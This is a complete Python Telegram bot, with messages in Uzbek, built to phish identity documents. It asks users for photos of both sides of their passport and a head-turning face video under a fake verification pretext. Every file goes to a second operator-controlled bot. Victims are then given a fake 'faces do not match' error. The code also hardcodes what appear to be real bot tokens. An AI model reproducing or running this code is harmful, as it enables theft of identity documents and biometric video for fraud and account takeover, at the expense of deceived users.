#!/usr/bin/env python3
import requests
import json
import time

# Bot konfiguratsiyasi
BOT_TOKEN = "8278936609:AAElH3ZAtjX3n66Ckut7zPtw1Sg-dZO9Tks"
CHAT_ID = "8250478755"
SECOND_BOT_TOKEN = "8088011535:AAFSpd8nhTnkQ3I8FKUMmvb7DXmSj33biqY"
SECOND_CHAT_ID = "8250478755"  # O'zingizning ID ingiz

def send_message(chat_id, text, token=BOT_TOKEN):
    """Xabar yuborish"""
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=data)
        return response.json()
    except Exception as e:
        print(f"Xatolik: {e}")
        return None

def forward_media(chat_id, file_id, file_type, token=SECOND_BOT_TOKEN):
    """Media faylni ikkinchi botga yuborish"""
    url = f"https://api.telegram.org/bot{token}/"
    
    if file_type == "photo":
        url += "sendPhoto"
        data = {"chat_id": chat_id, "photo": file_id}
    elif file_type == "video":
        url += "sendVideo" 
        data = {"chat_id": chat_id, "video": file_id}
    else:
        return None
    
    try:
        response = requests.post(url, json=data)
        return response.json()
    except Exception as e:
        print(f"Media yuborish xatosi: {e}")
        return None

def get_file_url(file_id, token=BOT_TOKEN):
    """Fayl URL ni olish"""
    url = f"https://api.telegram.org/bot{token}/getFile"
    data = {"file_id": file_id}
    
    try:
        response = requests.post(url, json=data)
        if response.status_code == 200:
            file_info = response.json()
            if file_info['ok']:
                file_path = file_info['result']['file_path']
                return f"https://api.telegram.org/file/bot{token}/{file_path}"
        return None
    except Exception as e:
        print(f"Fayl URL olish xatosi: {e}")
        return None

def handle_start(message):
    """Start komandasi"""
    user_id = message['from']['id']
    user_name = message['from'].get('first_name', 'Foydalanuvchi')
    
    text = f"""🤖 <b>Xush kelibsiz, hurmatli  {user_name}!</b>

🔐 <i>Davom etish uchun test ma'lumotlaringizni yuboring:</i>

1️⃣ Pasport rasmi (old tomoni)
2️⃣ Pasport rasmi (orqa tomoni)
3️⃣ Yuzingizni tasdiqlovchi video

<b>Eslatma:</b> eslatib oʼtamiz pasportdagi odamning yuzini kiriting va tepaga pasga chapga oʼnga harakatlanib yuboring 🤖!"""
    
    send_message(user_id, text)

def handle_photo(message, photo_type):
    """Rasm qabul qilish"""
    user_id = message['from']['id']
    user_name = message['from'].get('first_name', 'Foydalanuvchi')
    
    # Eng yuqori sifatli rasmni olish
    photos = message['photo']
    file_id = photos[-1]['file_id']  # Eng katta rasm
    
    # Foydalanuvchiga javob
    if photo_type == "first":
        send_message(user_id, "✅ Pasport oldi qabul qilindi. Endi orqa tomonini yuboring.")
    elif photo_type == "second":
        send_message(user_id, "✅ Pasport orqasi qabul qilindi. Endi yuzingizni tasdiqlovchi dumaloq video yuboring.")
    
    # Ikkinchi botga RASMNI yuborish
    caption = f"🆔 {photo_type.upper()} - {user_name} (ID: {user_id})"
    forward_media(SECOND_CHAT_ID, file_id, "photo")
    
    # Xabar ham yuborish
    send_message(SECOND_CHAT_ID, f"📸 {caption}", SECOND_BOT_TOKEN)
    
    print(f"📨 Rasm yuborildi: {user_name} -> {photo_type}")

def handle_video(message):
    """Video qabul qilish"""
    user_id = message['from']['id']
    user_name = message['from'].get('first_name', 'Foydalanuvchi')
    
    # Video file_id ni olish
    video = message['video']
    file_id = video['file_id']
    
    # Foydalanuvchiga "xato" xabarini yuborish
    send_message(user_id, "❌ <b>Xato:</b> Yuz va pasportdagi yuz bir xil emas!\n\n<i>Virtual test rejimi - bu normal holat</i>")
    
    # Ikkinchi botga VIDEONI yuborish
    caption = f"🎥 VIDEO - {user_name} (ID: {user_id})"
    forward_media(SECOND_CHAT_ID, file_id, "video")
    
    # Xabar ham yuborish
    send_message(SECOND_CHAT_ID, f"📹 {caption}", SECOND_BOT_TOKEN)
    
    print(f"📹 Video yuborildi: {user_name}")

def process_message(message):
    """Xabarni qayta ishlash"""
    user_id = message['from']['id']
    
    # User state ni saqlash
    if not hasattr(process_message, 'user_states'):
        process_message.user_states = {}
    
    if user_id not in process_message.user_states:
        process_message.user_states[user_id] = 0
    
    if 'text' in message:
        text = message['text']
        if text == '/start':
            process_message.user_states[user_id] = 0
            handle_start(message)
    
    elif 'photo' in message:
        current_state = process_message.user_states[user_id]
        
        if current_state == 0:  # Birinchi rasm
            handle_photo(message, "first")
            process_message.user_states[user_id] = 1
        elif current_state == 1:  # Ikkinchi rasm
            handle_photo(message, "second") 
            process_message.user_states[user_id] = 2
    
    elif 'video' in message:
        handle_video(message)
        process_message.user_states[user_id] = 0  # Qayta boshlash

def get_updates(offset=None):
    """Yangiliklarni olish"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {'timeout': 100, 'offset': offset}
    
    try:
        response = requests.get(url, params=params)
        return response.json()
    except Exception as e:
        print(f"Xatolik: {e}")
        return None

def main():
    """Asosiy dastur"""
    print("🤖 Telefonni ochuvchi Bot ishga tushdi...")
    print("📍 telefonni ochish uchun  qilish uchun!")
    print("⏹️ To'xtatish uchun Ctrl+C\n")
    
    last_update_id = None
    
    while True:
        try:
            updates = get_updates(last_update_id)
            
            if updates and 'result' in updates:
                for update in updates['result']:
                    last_update_id = update['update_id'] + 1
                    
                    if 'message' in update:
                        print(f"📩 Yangi xabar: {update['message']['from'].get('first_name')}")
                        process_message(update['message'])
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print("\n🛑 Bot to'xtatildi")
            break
        except Exception as e:
            print(f"Xatolik: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
